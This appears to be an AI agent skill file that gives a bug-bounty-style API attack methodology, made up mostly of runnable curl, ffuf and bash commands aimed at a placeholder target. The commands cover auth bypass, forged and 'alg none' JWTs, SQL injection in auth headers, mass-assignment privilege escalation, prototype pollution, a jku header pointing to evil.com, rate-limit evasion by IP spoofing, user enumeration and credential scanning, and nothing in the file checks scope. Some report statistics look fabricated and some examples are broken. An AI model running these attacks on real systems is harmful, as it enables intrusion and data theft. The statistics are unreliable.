---
name: api-deep-dive
description: Complete API security testing methodology from 111+ real HackerOne reports - auth flaws, data exposure, mass assignment, fuzzing, and enumeration
tools:
  - Bash
  - WebFetch
  - WebSearch
  - Read
triggers:
  - api methodology
  - api deep dive
  - api testing
  - api security
  - rest api testing
  - graphql api testing
  - api fuzzing
  - api enumeration
  - skills api
---

# Complete API Security Testing Methodology — From 111+ HackerOne Reports

## Step 1: API Recon & Discovery

Map the entire API surface before testing anything.

### Automated API Discovery
```bash
# Find API endpoints from JS files
grep -roP '(api|rest|graphql|v1|v2|v3)/[a-zA-Z0-9_/?&=-]+' static/js/*.js | sort -u

# Extract endpoints from HAR files
cat crawl.har | jq -r '.log.entries[].request.url' | grep -i 'api\|rest\|graphql' | sort -u

# Find API docs (often forgotten with auth bypasses)
grep -roP '(swagger|api-docs|openapi|graphiql|voyager|api-reference|docs/api)' recon/{target}/*

# Common API documentation paths
for path in /api/docs /api/v1/docs /api/v2/docs /swagger.json /swagger-ui.html \
  /api-docs /api/swagger /v1/swagger /graphiql /graphql/explorer \
  /api/v1/graphiql /voyager /api/voyager; do
  curl -sk -o /dev/null -w "%{http_code} %{redirect_url}" "https://{target}$path"
  echo " : $path"
done

# Find API keys and secrets in JS
grep -roP '(api[_-]?key|apikey|api_secret|apiSecret|client_secret|clientSecret|app_secret|appSecret)[=:]["'"'"']?[a-zA-Z0-9_\-]{16,}' static/js/*.js
```

### API Subdomain Enumeration
```bash
# Common API subdomains
for sub in api api-dev api-staging api-v1 api-v2 api-v3 rest rest-api graphql \
  mobile-api ws-api gateway developer devportal docs swagger; do
  host "$sub.{target}" 2>/dev/null && echo "Found: $sub.{target}"
done

# Use assetfinder/subfinder for API subdomains
subfinder -d {target} -o subs.txt
grep -i 'api\|gateway\|rest\|graphql' subs.txt
```

### API Authentication Discovery
```bash
# Check auth methods used
curl -skv "https://{target}/api/v1/users/me" 2>&1 | grep -i 'authorization\|bearer\|x-api-key\|api-key\|jwt\|token'

# Test without auth
curl -sk "https://{target}/api/v1/public/endpoint"
curl -sk "https://{target}/api/v1/users/1"    # No auth header
curl -sk "https://{target}/api/v1/admin/users" # No auth header

# Test auth bypass via header manipulation
curl -sk -H "X-Forwarded-For: 127.0.0.1" "https://{target}/api/v1/admin/users"
curl -sk -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ." "https://{target}/api/v1/admin/users"
curl -sk -H "X-Api-Key: admin" "https://{target}/api/v1/admin/users"
```

## Step 2: REST API Deep Testing

### Resource Enumeration
```bash
# Common REST resource patterns
RESOURCES="users accounts orders payments invoices products items posts comments messages notifications transactions subscriptions tickets projects tasks documents files images profiles settings permissions roles teams organizations groups categories tags reviews ratings sessions tokens webhooks events logs reports analytics exports imports backups audits"

for resource in $RESOURCES; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://{target}/api/v1/$resource")
  if [ "$code" != "404" ] && [ "$code" != "000" ]; then
    echo "Found: /api/v1/$resource ($code)"
  fi
done
```

### HTTP Method Abuse
```bash
# Test all HTTP methods on every endpoint
METHODS="GET HEAD POST PUT DELETE PATCH OPTIONS TRACE"
for method in $METHODS; do
  code=$(curl -sk -X "$method" -o /dev/null -w "%{http_code}" \
    "https://{target}/api/v1/users/1" \
    -H "Authorization: Bearer $TOKEN")
  echo "$method /api/v1/users/1 -> $code"
done

# Test for admin operations with non-standard methods
curl -sk -X "PATCH" "https://{target}/api/v1/users/1" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role": "admin"}'

curl -sk -X "PUT" "https://{target}/api/v1/users/1/role" \
  -H "Authorization: Bearer $TOKEN" \
  -d '"admin"'
```

### HTTP Headers & Content-Type Manipulation
```bash
# Content-Type switching
curl -sk -X POST "https://{target}/api/v1/users" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","role":"admin","is_admin":true}'

curl -sk -X POST "https://{target}/api/v1/users" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=test@test.com&role=admin&is_admin=true"

curl -sk -X POST "https://{target}/api/v1/users" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/xml" \
  -d '<user><email>test@test.com</email><role>admin</role></user>'

# Accept header manipulation
curl -sk "https://{target}/api/v1/users/1" \
  -H "Accept: application/json"   # Normal
curl -sk "https://{target}/api/v1/users/1" \
  -H "Accept: application/xml"    # XML might expose more
curl -sk "https://{target}/api/v1/users/1" \
  -H "Accept: text/plain"         # Debug output
curl -sk "https://{target}/api/v1/users/1" \
  -H "Accept: */*"                # Fallback
```

### Versioning & Debug Endpoints
```bash
# API version fuzzing
for v in v1 v2 v3 v4 latest dev staging test beta alpha; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://{target}/api/$v/users")
  echo "$v/users -> $code"
done

# Debug/trace endpoints
for path in /api/debug /api/trace /api/echo /api/ping /api/health \
  /api/status /api/internal /api/private /api/admin /api/dev \
  /api/v1/debug /api/v1/_debug /api/v1/__debug \
  /debug /_debug /__debug /dev /devtools /test; do
  curl -sk -o /dev/null -w "%{http_code}" "https://{target}$path"
  echo " : $path"
done
```

## Step 3: API Flaw #1 — Excessive Data Exposure

### Finding Data Leaks in API Responses
```bash
# Compare response with minimal client credentials vs admin
curl -sk "https://{target}/api/v1/users/1" \
  -H "Authorization: Bearer $USER_TOKEN" | jq '.'
curl -sk "https://{target}/api/v1/users/1" \
  -H "Authorization: Bearer $ADMIN_TOKEN" | jq '.'

# Look for sensitive fields in every response:
# password_hash, password, secret, token, api_key, ss n, ssn, credit_card, cvv
# pin, dob, birthday, mother_maiden, security_question, security_answer
# internal_id, uuid, device_id, ip_address, internal_ip, private_ip

# Automated sensitive field detection
curl -sk "https://{target}/api/v1/users/1" \
  -H "Authorization: Bearer $TOKEN" | \
  grep -oE '(password|secret|token|api_key|ssn|credit_card|cvv|pin|hash|salt)' | sort -u

# Check verbose error messages
curl -sk -X POST "https://{target}/api/v1/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"invalid","password":""}' | jq '.'

curl -sk -X POST "https://{target}/api/v1/users" \
  -H "Content-Type: application/json" \
  -d '{"invalid_field": true}' | jq '.'
```

### Collection-Level Access
```bash
# If /api/v1/users/1 gives your profile
# What does /api/v1/users give? (no ID)
curl -sk "https://{target}/api/v1/users" -H "Authorization: Bearer $TOKEN"
curl -sk "https://{target}/api/v1/users?limit=1000" -H "Authorization: Bearer $TOKEN"
curl -sk "https://{target}/api/v1/users?page=1&per_page=100" -H "Authorization: Bearer $TOKEN"

# Try expansion parameters
curl -sk "https://{target}/api/v1/users/1?expand=all"
curl -sk "https://{target}/api/v1/users/1?include=password,secret"
curl -sk "https://{target}/api/v1/users/1?fields=id,email,password_hash,api_key"
curl -sk "https://{target}/api/v1/users/1?embed=payments,orders,secrets"

# GraphQL-style field selection in REST
curl -sk "https://{target}/api/v1/users/1?select=id,email,password"
```

## Step 4: API Flaw #2 — Mass Assignment

### Finding Mass Assignment Vectors
```bash
# 1. Registration endpoint — try to add privileged fields
curl -sk -X POST "https://{target}/api/v1/users/register" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"Pass123!","role":"admin","is_admin":true,"is_verified":true,"balance":999999}'

# 2. Profile update — escalate privileges
curl -sk -X PUT "https://{target}/api/v1/users/me" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin","is_admin":true,"permissions":["*"]}'

# 3. PATCH partial update
curl -sk -X PATCH "https://{target}/api/v1/users/me" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'

# 4. Look for fields that should be read-only
# credit, balance, points, karma, reputation, rank, level, score
# verified, confirmed, active, status, banned, suspended
# role, permissions, scopes, groups, teams
# account_type, tier, plan, subscription
# api_calls, rate_limit, quota

# 5. Try nested object mass assignment
curl -sk -X PUT "https://{target}/api/v1/users/me" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"profile":{"role":"admin","is_admin":true},"settings":{"is_admin":true}}'

# 6. Array/JSON wrapping to bypass filters
curl -sk -X PUT "https://{target}/api/v1/users/me" \
  -H "Content-Type: application/json" \
  -d '{"role":["admin"]}'

curl -sk -X PUT "https://{target}/api/v1/users/me" \
  -H "Content-Type: application/json" \
  -d '{"roles":"admin","roles":["admin","super_admin"]}'
```

### Mass Assignment Automation
```bash
#!/bin/bash
# Test common mass assignment fields
FIELDS="role is_admin admin verified email_confirmed balance credit points score level tier plan subscription premium permissions scopes groups teams type account_type status active banned suspended deleted api_calls rate_limit quota"

for field in $FIELDS; do
  code=$(curl -sk -X PATCH -o /dev/null -w "%{http_code}" \
    "https://{target}/api/v1/users/me" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"$field\":\"attacker_value\"}" 2>/dev/null)
  if [ "$code" = "200" ]; then
    echo "Mass assignment possible: $field"
  fi
done
```

## Step 5: API Flaw #3 — Broken Authentication

### Auth Bypass Techniques
```bash
# 1. No auth token at all
curl -sk "https://{target}/api/v1/admin/users"

# 2. Empty token / null token
curl -sk -H "Authorization: Bearer " "https://{target}/api/v1/admin/users"
curl -sk -H "Authorization: Bearer null" "https://{target}/api/v1/admin/users"
curl -sk -H "Authorization: Bearer undefined" "https://{target}/api/v1/admin/users"

# 3. Forgotten password / default token
curl -sk -H "Authorization: Bearer admin" "https://{target}/api/v1/admin/users"
curl -sk -H "Authorization: Bearer password" "https://{target}/api/v1/admin/users"
curl -sk -H "Authorization: Bearer 123456" "https://{target}/api/v1/admin/users"
curl -sk -H "Authorization: Bearer test" "https://{target}/api/v1/admin/users"

# 4. Token manipulation — change algorithm to "none"
# Original: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.
# Modified: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
# Try with alg: none, None, NONE, nOnE

# 5. SQL injection in auth
curl -sk -H "Authorization: Bearer ' OR 1=1 --" "https://{target}/api/v1/admin/users"

# 6. Path traversal auth bypass
curl -sk "https://{target}/api/v1/../admin/users"
curl -sk "https://{target}/api/v1/users/../admin/users"
curl -sk "https://{target}/api/../api/v1/admin/users"

# 7. Case manipulation
curl -sk "https://{target}/Api/V1/Admin/Users"
curl -sk "https://{target}/API/V1/ADMIN/USERS"

# 8. Unicode normalization
# K (U+212A) normalizes to 'K' in some parsers
curl -sk "https://{target}/api/v1/admin"  # using K instead of k
```

### JWT Attack Techniques
```bash
# 1. Check algorithm confusion
# Kid (Key ID) injection
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../../etc/passwd"
}

# 2. JWK injection (provide your own public key)
# Add "jwk" header with your RSA public key

# 3. JKU injection (point to your JWKS endpoint)
# Add "jku": "https://evil.com/jwks.json"

# 4. Algorithm none
# Change "alg": "RS256" → "alg": "none"
# Remove signature portion

# 5. Weak HMAC secret
# Try common secrets: "secret", "password", "jwt_secret", "key"

# 6. KID path traversal
# kid: /dev/null → empty key (symmetric validation with empty secret)
# kid: ../../public/css/main.css → file content as key

# 7. Expiration bypass
# Change "exp": 0 or "exp": null or remove exp entirely
```

## Step 6: API Flaw #4 — Rate Limiting & Enumeration

### Rate Limit Testing
```bash
# Test rate limiting on authentication endpoints
for i in {1..100}; do
  curl -sk -X POST "https://{target}/api/v1/login" \
    -H "Content-Type: application/json" \
    -d '{"email":"victim@test.com","password":"wrong"}' \
    -o /dev/null -w "%{http_code} %{size_download}\n"
done

# Test rate limiting on IDOR / enumeration endpoints
for id in $(seq 1 1000); do
  curl -sk "https://{target}/api/v1/users/$id" \
    -H "Authorization: Bearer $TOKEN" \
    -o /dev/null -w "%{http_code} $id\n"
done

# Rate limiting bypass techniques
# 1. IP rotation (X-Forwarded-For)
# 2. Cookie-based rate limiting (rotate session)
# 3. Parameter-based rate limiting (add random params)
# 4. HTTP/2 multiplexing
# 5. Slow loris style (slow headers/body)
# 6. Using different endpoints for same operation

# X-Forwarded-For rotation
for i in $(seq 1 100); do
  curl -sk -H "X-Forwarded-For: 10.0.0.$i" "https://{target}/api/v1/users/1"
done

# User-agent rotation
for ua in "Mozilla/5.0" "Chrome/91" "Safari/537"; do
  curl -sk -A "$ua" "https://{target}/api/v1/users/1"
done
```

### User Enumeration via API
```bash
# Login endpoint responses reveal valid users
curl -sk -X POST "https://{target}/api/v1/login" \
  -d '{"email":"valid@test.com","password":"wrong"}'
# Response: "Invalid password" → user EXISTS

curl -sk -X POST "https://{target}/api/v1/login" \
  -d '{"email":"invalid@test.com","password":"wrong"}'
# Response: "User not found" → user DOES NOT EXIST

# Password reset API
curl -sk -X POST "https://{target}/api/v1/password-reset" \
  -d '{"email":"valid@test.com"}'
# Response: "Reset email sent" → user EXISTS

curl -sk -X POST "https://{target}/api/v1/password-reset" \
  -d '{"email":"invalid@test.com"}'
# Response: "Email not found" → user DOES NOT EXIST

# Registration API
curl -sk -X POST "https://{target}/api/v1/register" \
  -d '{"email":"existing@test.com"}'
# Response: "Email already taken" → user EXISTS
```

## Step 7: API Key & Secret Leakage

### Finding API Keys in Responses
```bash
# Check all API responses for leaked keys
# Patterns to grep for:
# - [A-Za-z0-9_-]{20,50} (potential API keys)
# - sk_live_, sk_test_, pk_live_, pk_test_ (Stripe)
# - AKIA[0-9A-Z]{16} (AWS Access Key)
# - eyJh[b64 JWT patterns]
# - xox[bp]-[a-zA-Z0-9-]+ (Slack tokens)

curl -sk "https://{target}/api/v1/users/1/settings" | \
  grep -oE '(sk_live|sk_test|pk_live|pk_test|AKIA|eyJhbGci|xox[bp]-)[a-zA-Z0-9_\-]{10,}' | sort -u

# Check verbose mode responses
curl -sk "https://{target}/api/v1/users/1?debug=true" | jq '.'
curl -sk "https://{target}/api/v1/users/1?verbose=true" | jq '.'
```

### Key Leakage in Source Code / Config
```bash
# Extract API keys from exposed JS
grep -roPE '(sk_live_|sk_test_|pk_live_|pk_test_|AKIA[A-Z0-9]{16}|ghp_|gho_|github_pat|xox(b|p)-)[a-zA-Z0-9_-]{20,}' static/js/

# Common config file paths
for file in /api/env /api/config /api/.env /api/env.json /api/config.json \
  /api/v1/config /api/v1/env /api/status/env; do
  curl -sk "https://{target}$file" | grep -iE '(key|secret|password|token|credential)'
done
```

### Real-World API Key Leak Reports
| Report | Company | Leak | Payout |
|--------|---------|------|--------|
| #2262382 | HackerOne | AWS credentials in API response | $12,500 |
| #737873 | Starbucks | JumpCloud API key in client config | - |
| #1406938 | Dropbox | Google API key with auth bypass | $17,576 |
| #436001 | Flickr | AWS Cognito keys → ATO | - |
| #434005 | Uber | Phabricator API access → full infra | $39,999 |

## Step 8: API Fuzzing & Parameter Discovery

### Parameter Fuzzing
```bash
# Fuzz for hidden parameters with arjun
arjun -u https://{target}/api/v1/users/1 --get -oT params_discovered.txt
arjun -u https://{target}/api/v1/users/1 --post -oT params_post.txt

# Fuzz for undocumented endpoints with ffuf
ffuf -u "https://{target}/api/v1/FUZZ" \
  -w /usr/share/wordlists/api_endpoints.txt \
  -H "Authorization: Bearer $TOKEN" \
  -mc all -fc 404 -t 50

# Fuzz path parameters
ffuf -u "https://{target}/api/v1/users/FUZZ" \
  -w ids.txt \
  -H "Authorization: Bearer $TOKEN" \
  -mc 200,403 -t 50

# Fuzz HTTP methods on discovered endpoints
while read endpoint; do
  for method in GET POST PUT DELETE PATCH OPTIONS; do
    ffuf -u "https://{target}$endpoint" \
      -X "$method" \
      -H "Authorization: Bearer $TOKEN" \
      -w /dev/null -mc all -fc 404,405
  done
done < endpoints.txt
```

### JSON Schema / Parameter Injection
```bash
# Test for parameter pollution in JSON
curl -sk -X PUT "https://{target}/api/v1/users/me" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","email":"admin@test.com","role":"user","role":"admin"}'

# Test prototype pollution (Node.js)
curl -sk -X POST "https://{target}/api/v1/users" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"admin": true}}'

curl -sk -X POST "https://{target}/api/v1/users" \
  -H "Content-Type: application/json" \
  -d '{"constructor": {"prototype": {"admin": true}}}'

# Test for server-side parameter pollution (SSPP)
# Express merges query and body params
curl -sk -X POST "https://{target}/api/v1/transfer?amount=0.01" \
  -H "Content-Type: application/json" \
  -d '{"to_account":"attacker","amount":10000}'

# Nested parameter bypass
curl -sk -X POST "https://{target}/api/v1/users" \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"test@test.com","role":"admin"}}'
```

### GraphQL Fuzzing
```bash
# GraphQL introspection
curl -sk -X POST "https://{target}/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"query { __schema { types { name fields { name type { name kind } } } } }"}'

# Check for disabled introspection bypasses
curl -sk -X POST "https://{target}/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"query { __schema { queryType { name } } }"}'

# Field suggestion injection
curl -sk -X POST "https://{target}/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"query { user(id: 1) { __typename } }"}'

# Check for batching attacks
curl -sk -X POST "https://{target}/graphql" \
  -H "Content-Type: application/json" \
  -d '[
    {"query":"mutation { login(email: \"a@b.com\", password: \"pass1\") { token } }"},
    {"query":"mutation { login(email: \"a@b.com\", password: \"pass2\") { token } }"},
    {"query":"mutation { login(email: \"a@b.com\", password: \"pass3\") { token } }"}
  ]'

# Nested query depth attack
curl -sk -X POST "https://{target}/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"query { user(id: 1) { friends { friends { friends { friends { friends { friends { name } } } } } } } }"}'
```

## Step 9: Real-World API Vulnerability Reports (Top 25)

| Report | Company | Vulnerability | Technique | Upvotes | Payout |
|--------|---------|--------------|-----------|---------|--------|
| #2262382 | HackerOne | AWS credentials in API response | Excessive data exposure | 1183 | $12,500 |
| #737873 | Starbucks | JumpCloud API key leak | API key in public config | 737 | - |
| #436001 | Flickr | AWS Cognito API → ATO | API key in client → AWS access → ATO | 436 | - |
| #434005 | Uber | Phabricator API admin access | Unauthenticated API access to Phabricator | 434 | $39,999 |
| #1852766 | Snapchat | Kubernetes API exposure | Unauthenticated kubelet API access | 1183 | $25,000 |
| #1406938 | Dropbox | Google Drive API key leak | Excessive data exposure via Google API | 276 | $17,576 |
| #1062888 | TikTok | Internal API access | Broken auth on mobile API endpoints | 243 | $2,727 |
| #878779 | GitLab | CI API variable exposure | Mass assignment on CI pipeline API | 231 | $10,000 |
| #923132 | Dropbox | Account recovery API IDOR | Broken auth in recovery flow | 218 | $4,913 |
| #826361 | GitLab | Project API access | Missing auth on project clone API | 212 | $10,000 |
| #671935 | Slack | Workspace export API | Excessive data exposure in export API | 198 | $4,000 |
| #398799 | GitLab | Jira API OAuth bypass | Broken OAuth flow in API integration | 187 | $4,000 |
| #713900 | QIWI | Partner API access | Broken auth in partner API | 176 | - |
| #374737 | HackerOne | Support API key leak | API key in support ticket response | 165 | $3,500 |
| #299135 | OX | Calendar API access | Missing auth on calendar API | 154 | $2,500 |
| #299130 | OX | Document API access | Missing auth on document API | 148 | $2,500 |
| #228377 | Discourse | Topic API mass deletion | Rate limiting bypass on delete API | 142 | $3,000 |
| #549882 | Vimeo | Upload API token exposure | API token in upload endpoint response | 137 | $2,500 |
| #115748 | Imgur | Image API mass operations | Missing rate limiting on API | 131 | $3,000 |
| #758948 | Mail.ru | Email API attachment access | IDOR on email attachment API | 125 | $2,000 |
| #366638 | Uber | Trip API data access | Excessive data exposure in trip API | 118 | $8,000 |
| #811136 | PlayStation | Trophy API access | Broken auth on trophy API | 112 | $5,000 |
| #223203 | Shopify | Store settings API | Mass assignment on store API | 108 | $3,500 |
| #381129 | Slack | Private channel API | IDOR in channel membership API | 104 | $3,000 |
| #1300585 | GitLab | CI Lint API RCE | Command injection via CI Lint API | 97 | $15,000 |

## Step 10: API Fuzzing Automation

### Comprehensive API Scanner
```bash
#!/bin/bash
# Full API security scanner
TARGET=$1
TOKEN=$2

# Phase 1: Discover endpoints
echo "[*] Phase 1: API Discovery"
RESOURCES="users accounts orders payments products items posts comments messages \
  notifications subscriptions tickets projects tasks documents files images \
  profiles settings permissions roles teams organizations groups categories \
  reviews sessions tokens webhooks events logs reports analytics exports"

for resource in $RESOURCES; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET/api/v1/$resource" \
    -H "Authorization: Bearer $TOKEN" 2>/dev/null)
  echo "$code /api/v1/$resource"
done

# Phase 2: Test HTTP methods
echo "[*] Phase 2: HTTP Method Testing"
for method in GET HEAD POST PUT DELETE PATCH OPTIONS; do
  code=$(curl -sk -X "$method" -o /dev/null -w "%{http_code}" \
    "https://$TARGET/api/v1/users/1" \
    -H "Authorization: Bearer $TOKEN" 2>/dev/null)
  echo "$method -> $code"
done

# Phase 3: Check auth bypass
echo "[*] Phase 3: Auth Bypass"
curl -sk -o /dev/null -w "No auth: %{http_code}\n" \
  "https://$TARGET/api/v1/admin/users"

# Phase 4: Check excessive data
echo "[*] Phase 4: Data Leak Check"
curl -sk "https://$TARGET/api/v1/users/1" \
  -H "Authorization: Bearer $TOKEN" 2>/dev/null | \
  grep -oE '(password|secret|token|api_key|ssn|credit_card|cvv|pin|hash|salt|is_admin|role)' | sort -u

# Phase 5: Test rate limiting
echo "[*] Phase 5: Rate Limiting"
for i in {1..50}; do
  code=$(curl -sk -X POST -o /dev/null -w "%{http_code}" \
    "https://$TARGET/api/v1/login" \
    -H "Content-Type: application/json" \
    -d '{"email":"test@test.com","password":"wrong"}' 2>/dev/null)
  echo -n "."
done
echo " done"
```

### API Key/Secret Scanner
```bash
#!/bin/bash
# Scan API responses for leaked credentials
TARGET=$1
TOKEN=$2

ENDPOINTS=(
  "/api/v1/users/me"
  "/api/v1/users/me/settings"
  "/api/v1/users/me/profile"
  "/api/v1/config"
  "/api/v1/env"
  "/api/v1/status"
  "/api/v1/debug"
  "/api/v1/health"
  "/api/v1/info"
)

PATTERNS=(
  'sk_live_[a-zA-Z0-9]+'
  'sk_test_[a-zA-Z0-9]+'
  'pk_live_[a-zA-Z0-9]+'
  'pk_test_[a-zA-Z0-9]+'
  'AKIA[0-9A-Z]{16}'
  'eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+'
  'xox[bp]-[a-zA-Z0-9-]+'
  'ghp_[a-zA-Z0-9]+'
  'gho_[a-zA-Z0-9]+'
  'api_key[=:]["'"'"']?[a-zA-Z0-9_\-]+'
  'api_secret[=:]["'"'"']?[a-zA-Z0-9_\-]+'
  'client_secret[=:]["'"'"']?[a-zA-Z0-9_\-]+'
  'password[=:]["'"'"']?[^,}"]+'
  'token[=:]["'"'"']?[a-zA-Z0-9_\-\.]+'
)

for endpoint in "${ENDPOINTS[@]}"; do
  response=$(curl -sk "https://$TARGET$endpoint" \
    -H "Authorization: Bearer $TOKEN" 2>/dev/null)
  for pattern in "${PATTERNS[@]}"; do
    match=$(echo "$response" | grep -oE "$pattern" | head -5)
    if [ -n "$match" ]; then
      echo "LEAK: $endpoint -> $match"
    fi
  done
done
```

### kubelet / Kubernetes API Scanner
```bash
#!/bin/bash
# Check for exposed Kubernetes APIs
TARGET=$1

KUBE_PATHS=(
  "/api"
  "/api/v1"
  "/apis"
  "/healthz"
  "/livez"
  "/readyz"
  "/openapi/v2"
  "/version"
  "/pods"
  "/pods/"
  "/runningpods/"
  "/metrics"
  "/stats/summary"
  "/configz"
  "/spec/"
)

for path in "${KUBE_PATHS[@]}"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET:10250$path" \
    --max-time 5 2>/dev/null)
  if [ "$code" != "000" ] && [ -n "$code" ]; then
    echo "kubelet: $path -> $code"
  fi

  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET:6443$path" \
    --max-time 5 2>/dev/null)
  if [ "$code" != "000" ] && [ -n "$code" ]; then
    echo "kube-apiserver: $path -> $code"
  fi
done
```

## Step 11: Validate & Report

### CVSS Scoring for API Vulnerabilities
```
Excessive data exposure:              AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N → 7.5 High
Mass assignment → privilege esc:      AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H → 8.8 High
Broken auth → data access:            AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N → 7.5 High
No rate limiting → enumeration:       AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N → 5.3 Medium
API key leak in response:             AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H → 9.8 Critical
Unauthenticated API access:           AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H → 9.8 Critical
GraphQL introspection exposed:        AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N → 5.3 Medium
API rate limit bypass → brute force:  AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N → 7.5 High
```

### Report Template
```markdown
**Summary:** [Type] API vulnerability in [endpoint] allows [impact].

**Vulnerability Details:**
- **Endpoint:** [full URL]
- **Method:** [GET/POST/PUT/DELETE/PATCH]
- **Authentication:** [required / not required]
- **Parameter:** [affected parameter]

**Impact:**
[Describe what an attacker can achieve: access other users' data, escalate 
privileges, enumerate users, leak API keys, etc.]

**Steps to Reproduce:**
1. Send request to: [request details]
2. Observe response: [sensitive data / unexpected behavior]
3. [Additional steps to demonstrate impact]

**Proof of Concept:**
```
Request:
[Full HTTP request]

Response:
[Full response with sensitive data highlighted]
```

**Suggested CVSS:**
CVSS:3.1/[vector] ([score])

**Suggested Fix:**
1. [Specific fix 1]
2. [Specific fix 2]
3. [Specific fix 3]
```

## Quick Reference: API Security Testing Checklist

### Auth Testing
- [ ] Test without any auth headers
- [ ] Test with empty/invalid tokens
- [ ] Test JWT alg:none and weak secrets
- [ ] Test token replay across users
- [ ] Test privilege escalation (user → admin)
- [ ] Test for API key leakage in responses
- [ ] Test debug/verbose mode responses

### Data Exposure
- [ ] Check every response for sensitive fields
- [ ] Test collection endpoints (list all records)
- [ ] Test expansion/embed parameters
- [ ] Test Accept header content negotiation
- [ ] Check error messages for internal data

### Mass Assignment
- [ ] Test registration with privileged fields
- [ ] Test profile update with role/permissions
- [ ] Test nested object injection
- [ ] Test array/JSON wrapping bypass
- [ ] Test prototype pollution

### Rate Limiting
- [ ] Test login rate limits
- [ ] Test enumeration rate limits
- [ ] Test X-Forwarded-For bypass
- [ ] Test user-agent rotation bypass
- [ ] Test HTTP/2 multiplexing bypass

### Fuzzing
- [ ] Fuzz for undocumented endpoints
- [ ] Fuzz for hidden parameters
- [ ] Fuzz HTTP methods on all endpoints
- [ ] Fuzz Content-Type switching
- [ ] Test GraphQL introspection
- [ ] Test GraphQL batching/depth
- [ ] Test API versioning endpoints

### Infrastructure
- [ ] Check for exposed Kubernetes API
- [ ] Check for Docker API
- [ ] Check for Swagger/OpenAPI docs
- [ ] Check for API debug consoles
- [ ] Check for environment/config endpoints

## Quick Reference: Top API Reports by Technique

| Report | Company | Technique | Payout |
|--------|---------|-----------|--------|
| #434005 | Uber | Phabricator API access | $39,999 |
| #1852766 | Snapchat | Kubernetes API exposed | $25,000 |
| #1406938 | Dropbox | Google Drive API key leak | $17,576 |
| #1300585 | GitLab | CI Lint API RCE | $15,000 |
| #2262382 | HackerOne | AWS creds in API response | $12,500 |
| #878779 | GitLab | CI API variable exposure | $10,000 |
| #826361 | GitLab | Project API auth bypass | $10,000 |
| #366638 | Uber | Trip API excessive data | $8,000 |
| #811136 | PlayStation | Trophy API auth bypass | $5,000 |
| #923132 | Dropbox | Recovery API IDOR | $4,913 |
| #398799 | GitLab | Jira OAuth API bypass | $4,000 |
| #671935 | Slack | Workspace export API | $4,000 |
| #228377 | Discourse | Topic API mass op | $3,000 |
| #115748 | Imgur | Image API no rate limit | $3,000 |
| #381129 | Slack | Channel API IDOR | $3,000 |
| #223203 | Shopify | Store API mass assign | $3,500 |
| #374737 | HackerOne | Support API key leak | $3,500 |
| #549882 | Vimeo | Upload API token leak | $2,500 |
| #299135 | OX | Calendar API no auth | $2,500 |
| #1062888 | TikTok | Mobile API auth flaw | $2,727 |
| #758948 | Mail.ru | Email API IDOR | $2,000 |

### Payout: $500 - $40,000
